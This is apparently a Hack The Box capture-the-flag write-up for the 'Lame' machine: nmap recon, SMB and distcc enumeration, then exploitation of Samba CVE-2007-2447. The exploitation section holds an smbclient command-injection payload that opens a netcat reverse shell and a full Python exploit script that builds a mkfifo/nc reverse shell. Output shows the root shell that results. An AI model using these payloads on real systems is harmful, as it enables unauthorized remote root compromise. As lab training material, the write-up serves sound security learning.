---
title: Hack The Box - Lame
date: 2022-11-11
categories: [hackthebox]
tags: [windows,cve,metasploit,easy]
comments: true
toc: true
---
![](/assets/Hackthebox/Lame/0.png)

## Recon
Starting with `nmap` scan.

```bash
# nmap --min-rate 10000 -oN lame.nmap 10.10.10.3 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:14 +0545 
Nmap scan report for 10.10.10.3 
Host is up (0.63s latency). 
Not shown: 996 filtered tcp ports (no-response) 
PORT    STATE SERVICE 
21/tcp  open  ftp 
22/tcp  open  ssh 
139/tcp open  netbios-ssn 
445/tcp open  microsoft-ds

# Full TCP port scan
# nmap -p- --min-rate 10000 -oN lame.nmap 10.10.10.3 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:14 +0545 
Nmap scan report for 10.10.10.3 
Host is up (0.59s latency). 
Not shown: 65530 filtered tcp ports (no-response) 
PORT     STATE SERVICE 
21/tcp   open  ftp 
22/tcp   open  ssh 
139/tcp  open  netbios-ssn 
445/tcp  open  microsoft-ds 
3632/tcp open  distccd 
Nmap done: 1 IP address (1 host up) scanned in 133.07 seconds

# Full UDP port scan

#nmap -sU -p- --min-rate 10000 -oN lame.nmap 10.10.10.3 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:17 +0545 
Nmap scan report for 10.10.10.3 
Host is up (0.48s latency). 
Not shown: 65531 open|filtered udp ports (no-response) 
PORT     STATE  SERVICE 
22/udp   closed ssh 
139/udp  closed netbios-ssn 
445/udp  closed microsoft-ds 
3632/udp closed distcc 
Nmap done: 1 IP address (1 host up) scanned in 50.50 seconds


#nmap -sC -sV -p 22,139,445,3632 10.10.10.3 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:19 +0545 
Nmap scan report for 10.10.10.3 
Host is up (0.51s latency). 
PORT     STATE SERVICE     VERSION
21/tcp open  ftp     vsftpd 2.3.4 
|_ftp-anon: Anonymous FTP login allowed (FTP code 230) 
| ftp-syst:  
|   STAT:  
| FTP server status: 
|      Connected to 10.10.14.2 
|      Logged in as ftp 
|      TYPE: ASCII 
|      No session bandwidth limit 
|      Session timeout in seconds is 300 
|      Control connection is plain text 
|      Data connections will be plain text 
|      vsFTPd 2.3.4 - secure, fast, stable 
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 
| ssh-hostkey:  
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) 
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
Host script results: 
|_clock-skew: mean: 2h29m43s, deviation: 3h32m09s, median: -17s 
| smb-os-discovery:  
|   OS: Unix (Samba 3.0.20-Debian) 
|   Computer name: lame 
|   NetBIOS computer name:  
|   Domain name: hackthebox.gr 
|   FQDN: lame.hackthebox.gr 
|_  System time: 2022-11-11T08:34:45-05:00 
|_smb2-time: Protocol negotiation failed (SMB2) 
| smb-security-mode:  
|   account_used: <blank> 
|   authentication_level: user 
|   challenge_response: supported 
|_  message_signing: disabled (dangerous, but default) 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 60.24 seconds
```
Our initial recon shows that we potentially have four different points of entry to this machine.
- **Port 21:**  vsftpd 2.3.4 (Anonymous FTP login allowed)
- **Port 22:** OpenSSH 4.7p1 Debian 8ubuntu1
- **Port 139/445:** Running samba 3.0.20-Debian
- Port 3632:** distccd v1

## Enumeration

### Port - 21 (vsftpd 2.3.4 )

### Anonymous Login

Since FTP allows `anonymous logins`, checked it, but the directory was empty.

A quick google search shows us that this version is famously vulnerable to a `backdoor command execution` that is triggered by entering a string that contains the characters “:)” as the username. When the backdoor is triggered, the target machine opens a shell on port `6200`.
Found a nmap script to check this vulnerability.Scanning with `nmap script` shows that this machine is `not vulnerable`.

```bash
#nmap --script ftp-vsftpd-backdoor.nse 10.10.10.3 -p 21 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 19:33 +0545 
Nmap scan report for 10.10.10.3 
Host is up (0.27s latency). 
PORT   STATE SERVICE 
21/tcp open  ftp 
Nmap done: 1 IP address (1 host up) scanned in 27.98 seconds
```

### SMB - TCP 445


### Anonymous Login
`smbmap` shows only `/tmp` directory is accessible without credentials.
```bash
#smbmap -H 10.10.10.3 
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                         
        Disk                                                  	Permissions	Comment 
	----                                                  	-----------	------- 
	print$                                            	NO ACCESS	Printer Drivers 
	tmp                                               	READ, WRITE	oh noes! 
	opt                                               	NO ACCESS	 
	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian)) 
	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
```
After checking the `/tmp` directory with `smbclient`, it seems there's nothing interesting.
```bash

#smbclient -N //10.10.10.3/tmp 
Anonymous login successful 
Try "help" to get a list of possible commands. 
smb: \> dir 
  .                                   D        0  Fri Nov 11 19:40:58 2022 
  ..                                 DR        0  Sat Oct 31 13:18:58 2020 
  .ICE-unix                          DH        0  Fri Nov 11 18:28:11 2022 
  vmware-root                        DR        0  Fri Nov 11 18:28:39 2022 
  .X11-unix                          DH        0  Fri Nov 11 18:28:36 2022 
  .X0-lock                           HR       11  Fri Nov 11 18:28:36 2022 
  5575.jsvc_up                        R        0  Fri Nov 11 18:29:13 2022 
  vgauthsvclog.txt.0                  R     1600  Fri Nov 11 18:28:10 2022 
		7282168 blocks of size 1024. 5386512 blocks available 
smb: \>
```

On checking searchsplpoit, we got some exploits for  samba 3.0.
![](/assets/Hackthebox/Lame/1.png)

However,
```bash
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) 
```
seems interesting. This is `CVE-2007-2447`, often referred to as `Samba usermap script`.On checking the script, there seems to be an issue with the `username` field. If we send shell metacharacters into the username we exploit a vulnerability which allows us to execute arbitrary commands.

Going through the code tells us that the script is running the following command, where payload.encoded would be a reverse shell sent back to our attack machine.
```bash
"/=`nohup " + payload.encoded + "`"
```

### Port 3632 distcc v1
Googling `“distcc v1”` reveals that this service is vulnerable to a `remote code execution` and there’s an `nmap script` that can verify that. On executing nmap script, it states that this machine is `vulnerable`.
```bash

#nmap --script distcc-cve2004-2687.nse -p 3632 10.10.10.3 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-11 20:11 +0545 
Nmap scan report for 10.10.10.3 
Host is up (0.31s latency). 
PORT     STATE SERVICE 
3632/tcp open  distccd 
| distcc-cve2004-2687:  
|   VULNERABLE: 
|   distcc Daemon Command Execution 
|     State: VULNERABLE (Exploitable) 
|     IDs:  CVE:CVE-2004-2687 
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C) 
|       Allows executing of arbitrary commands on systems running distccd 3.1 and 
|       earlier. The vulnerability is the consequence of weak service configuration. 
|        
|     Disclosure date: 2002-02-01 
|     Extra information: 
|        
|     uid=1(daemon) gid=1(daemon) groups=1(daemon) 
|    
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687 
|       https://distcc.github.io/security.html 
|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687 
Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
```


## Exploitation:

### 1. Samba Exploit
Exploing using smbclient.
```bash
#smbclient //10.10.10.3/tmp 
Enter WORKGROUP\niraz's password:  
Anonymous login successful 
Try "help" to get a list of possible commands. 
smb: \> logon "/=`nohup nc -nv 10.10.14.2 4444 -e /bin/sh`" 
Password:
```
and we get connection back to our machine.
```bash 
#nc -lvnp 4444 
listening on [any] 4444 ... 
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 53095
whoami 
root
```
### 2. Exploiting samba using python script
After Googling it let me to this [GitHub](https://github.com/amriunix/CVE-2007-2447) with a Python POC for the exploit. we can get a shell easily, by following the “install” instructions and then running the script:

But writing my own script, so that i can have some practice in writing code.
```python
import sys 
from smb.SMBConnection import SMBConnection

def exploit(rhost,rport,lhost,lport): 
    payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago' 
    username = "/=`nohup " + payload + "`" 
     
    smb_conn = SMBConnection(username, "", "", "") 
    try: 
        smb_conn.connect(rhost,rport) 
    except: 
        print("[+] Payload was sent but something went wrong - check netcat !")

def main(): 
    print("[*] CVE-2007-2447 - Samba usermap script") 
    if len(sys.argv) != 5: 
        print("(+)Usage: %s <rhost> <rport> <lhost> <lport> " % sys.argv[0]) 
    else: 
        print("[+] Connecting !") 
        rhost = sys.argv[1] 
        rport = sys.argv[2] 
        lhost = sys.argv[3] 
        lport = sys.argv[4] 
        exploit(rhost,rport,lhost,lport)

if __name__ == '__main__': 
    main()
```
running the above `python script` we get the root shell
```bash
#python3 lame-smb-exploit.py 10.10.10.3 139 10.10.14.2 4444 
[*] CVE-2007-2447 - Samba usermap script 
[+] Connecting !
```

```bash
#nc -lvnp 4444 
listening on [any] 4444 ... 
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 39930
whoami
root
```
To get a nice shell we can use pty
```bash
python -c 'import pty; pty.spawn("bash")' 
root@lame:/#
```
